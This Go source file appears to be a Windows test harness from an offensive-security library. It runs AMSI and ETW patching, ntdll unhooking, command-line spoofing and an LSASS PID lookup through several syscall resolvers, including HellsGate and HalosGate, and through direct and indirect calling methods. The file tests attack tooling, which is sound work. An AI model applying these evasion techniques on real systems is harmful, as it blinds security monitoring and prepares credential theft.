//go:build windows

// syscall-matrix — panorama 17 of the doc-truth audit.
//
// Built strictly from the user-facing markdown:
//   - docs/techniques/syscalls/README.md           — three orthogonal axes,
//                                                    "downstream packages
//                                                    accept a *Caller and
//                                                    inherit the chosen
//                                                    posture without
//                                                    recompiling"
//   - docs/techniques/syscalls/ssn-resolvers.md    — 4 resolvers (no Chain
//                                                    in this panorama: each
//                                                    resolver is exercised
//                                                    on its own to surface
//                                                    per-resolver drifts)
//   - docs/techniques/syscalls/direct-indirect.md  — 5 calling methods
//   - docs/techniques/evasion/amsi-bypass.md       — amsi.PatchScanBuffer,
//                                                    PatchOpenSession,
//                                                    PatchAll
//   - docs/techniques/evasion/etw-patching.md      — etw.Patch,
//                                                    PatchNtTraceEvent,
//                                                    PatchAll
//   - docs/techniques/evasion/ntdll-unhooking.md   — unhook.PerunUnhook,
//                                                    ClassicUnhook
//   - docs/techniques/injection/create-remote-thread.md
//                                                  — inject.FindAllThreadsNt
//                                                    (read-only thread enum)
//   - docs/techniques/credentials/lsassdump.md     — lsassdump.LsassPID
//                                                    (read-only PID lookup)
//
// Each cell = (method, resolver, technique) tested in isolation. No Chain.
// No technique-to-technique chaining. Total grid: 5 × 4 × 10 = 200 cells
// per privilege level. Drifts to look for:
//   - a method that silently degrades the technique on one resolver
//   - a resolver that fails on a hooked Nt* the technique relies on
//   - admin-vs-lowuser deltas that contradict the technique's doc page
package main

import (
	"fmt"
	"os"

	"github.com/oioio-space/maldev/credentials/lsassdump"
	"github.com/oioio-space/maldev/evasion/amsi"
	"github.com/oioio-space/maldev/evasion/etw"
	"github.com/oioio-space/maldev/evasion/unhook"
	"github.com/oioio-space/maldev/inject"
	"github.com/oioio-space/maldev/process/tamper/fakecmd"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

type namedResolver struct {
	name string
	r    wsyscall.SSNResolver
}

type technique struct {
	name string
	run  func(*wsyscall.Caller) error
}

func main() {
	resolvers := []namedResolver{
		{"HellsGate", wsyscall.NewHellsGate()},
		{"HalosGate", wsyscall.NewHalosGate()},
		{"TartarusGate", wsyscall.NewTartarus()},
		{"HashGate", wsyscall.NewHashGate()},
	}
	methods := []wsyscall.Method{
		wsyscall.MethodWinAPI,
		wsyscall.MethodNativeAPI,
		wsyscall.MethodDirect,
		wsyscall.MethodIndirect,
		wsyscall.MethodIndirectAsm,
	}
	selfPID := os.Getpid()
	// Deliberately omitted from the matrix:
	//   - evasion/acg.Enable      — sets ProhibitDynamicCode process-wide;
	//                               once on, every subsequent Direct/Indirect
	//                               cell fails to flip its stub page to RX.
	//                               Also: caller arg is accepted but unused
	//                               (kernel32 path), so 5×4 cells would yield
	//                               identical results — no composability
	//                               signal.
	//   - evasion/blockdlls.Enable — caller arg accepted but unused for the
	//                               same reason. Test value zero across the
	//                               method/resolver axes.
	//
	// Unhook techniques mutate the in-process ntdll globally and are listed
	// last so the first 9 techniques exercise each (method, resolver) cell
	// against the original (potentially hooked) ntdll. Otherwise an early
	// unhook cell would mask resolver drifts that only manifest on a
	// hooked ntdll.
	techniques := []technique{
		{"amsi.PatchScanBuffer", amsi.PatchScanBuffer},
		{"amsi.PatchOpenSession", amsi.PatchOpenSession},
		{"amsi.PatchAll", amsi.PatchAll},
		{"etw.Patch", etw.Patch},
		{"etw.PatchNtTraceEvent", etw.PatchNtTraceEvent},
		{"etw.PatchAll", etw.PatchAll},
		{"inject.FindAllThreadsNt(self)", func(c *wsyscall.Caller) error {
			_, err := inject.FindAllThreadsNt(selfPID, c)
			return err
		}},
		{"lsassdump.LsassPID", func(c *wsyscall.Caller) error {
			_, err := lsassdump.LsassPID(c)
			return err
		}},
		{"fakecmd.Spoof(notepad.exe)", func(c *wsyscall.Caller) error {
			return fakecmd.Spoof("notepad.exe", c)
		}},
		{"unhook.PerunUnhook", unhook.PerunUnhook},
		{"unhook.ClassicUnhook(NtAllocateVirtualMemory)", func(c *wsyscall.Caller) error {
			return unhook.ClassicUnhook("NtAllocateVirtualMemory", c, nil)
		}},
	}

	// 1. Resolver-only matrix — verbatim from ssn-resolvers.md "Combined
	//    Example" (lines 286-324). Surfaces resolver bugs before any
	//    Caller machinery is involved.
	functions := []string{
		"NtAllocateVirtualMemory",
		"NtProtectVirtualMemory",
		"NtCreateThreadEx",
		"NtWriteVirtualMemory",
	}
	fmt.Println("=== Resolver matrix (4 resolvers x 4 Nt funcs) ===")
	for _, nr := range resolvers {
		for _, fn := range functions {
			ssn, err := nr.r.Resolve(fn)
			if err != nil {
				fmt.Printf("[%s] %s: FAILED (%v)\n", nr.name, fn, err)
			} else {
				fmt.Printf("[%s] %s: SSN=0x%04X\n", nr.name, fn, ssn)
			}
		}
	}

	// 2. Caller smoke — each method × each resolver, NtClose 0xDEAD. Same
	//    probe as win/syscall/syscall_test.go: must return
	//    STATUS_INVALID_HANDLE (0xC0000008) on every cell.
	fmt.Println("\n=== Caller matrix (5 methods x 4 resolvers, NtClose 0xDEAD) ===")
	for _, m := range methods {
		for _, nr := range resolvers {
			runNtClose(m, nr)
		}
	}

	// 3. Full composability sweep — 5 × 4 × N techniques, each cell
	//    isolated (fresh Caller, fresh technique call, no chaining).
	fmt.Println("\n=== Technique matrix (5 methods x 4 resolvers x N techniques) ===")
	for _, m := range methods {
		for _, nr := range resolvers {
			for _, t := range techniques {
				runCell(m, nr, t)
			}
		}
	}
}

func runNtClose(m wsyscall.Method, nr namedResolver) {
	caller := wsyscall.New(m, nr.r)
	defer caller.Close()
	ret, err := caller.Call("NtClose", uintptr(0xDEAD))
	fmt.Printf("[%s/%s] NtClose: ret=0x%X err=%v\n", m, nr.name, ret, err)
}

func runCell(m wsyscall.Method, nr namedResolver, t technique) {
	caller := wsyscall.New(m, nr.r)
	defer caller.Close()
	if err := t.run(caller); err != nil {
		fmt.Printf("[%s/%s/%s] FAIL: %v\n", m, nr.name, t.name, err)
	} else {
		fmt.Printf("[%s/%s/%s] OK\n", m, nr.name, t.name)
	}
}
